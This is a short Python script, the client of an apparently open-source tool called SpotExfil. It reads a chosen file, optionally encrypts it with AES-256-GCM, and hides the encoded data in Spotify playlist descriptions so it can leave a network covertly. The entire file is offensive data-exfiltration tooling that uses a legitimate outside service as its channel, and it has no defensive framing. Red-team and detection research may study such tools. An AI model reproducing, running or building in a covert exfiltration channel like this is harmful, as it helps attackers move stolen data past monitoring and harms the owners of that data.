#!/usr/bin/env python3
"""SpotExfil Client - Exfiltrate data via Spotify playlists.

Reads a file, encodes it (optionally encrypts with AES-256-GCM),
and stores it across Spotify playlist descriptions (512 chars each).

Pre-requisites:
    Environment variables:
        SPOTIFY_USERNAME, SPOTIFY_CLIENT_ID,
        SPOTIFY_CLIENT_SECRET, SPOTIFY_REDIRECTURI
"""

import argparse

import encoding
import spotapi as spot

__author__ = '@sourcefrenchy'
__copyright__ = 'none'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'


def parse_args():
    """Parse command-line arguments.

    Returns:
        argparse.Namespace with 'file' and optional 'key' attributes.
    """
    parser = argparse.ArgumentParser(
        description='SpotExfil: exfiltrate data via Spotify playlists'
    )
    parser.add_argument(
        '-f', '--file', required=True,
        help='Path to the file to exfiltrate'
    )
    parser.add_argument(
        '-k', '--key', default=None,
        help='Encryption passphrase for AES-256-GCM (recommended)'
    )
    return parser.parse_args()


def main():
    """Main entry point for the exfiltration client."""
    args = parse_args()

    spotify = spot.Spot()
    cipher = encoding.Subcipher(spotify, encryption_key=args.key)

    spotify.clear_data()
    encoded = cipher.encode_payload(args.file)
    spotify.generate_playlists(encoded)


if __name__ == "__main__":
    main()
